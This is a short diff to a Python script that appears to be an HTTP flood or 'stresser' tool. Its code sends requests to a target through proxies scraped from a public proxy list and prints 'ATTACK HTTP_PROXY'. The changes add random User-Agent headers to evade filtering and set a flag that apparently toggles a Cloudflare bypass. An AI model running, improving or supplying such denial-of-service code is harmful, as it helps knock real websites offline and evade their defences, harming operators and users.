@@ -35,6 +35,7 @@ def run(target, proxies, cfbp):
         proxy = random.choice(proxies)
         proxiedRequest = requests.Session()
         proxiedRequest.proxies = {'http': 'http://' + proxy}
+        headers = {'User-Agent': rand_ua()}
         
         try:
             response = proxiedRequest.get(target, headers=headers)
@@ -98,6 +99,7 @@ def ioStresser():
     proxies = []
 
     if attack_type == 1:
+        cfbp = 0
         print("\n[%s-%s] ATTACK HTTP_PROXY\n"%(Y,C))
         try:
             proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
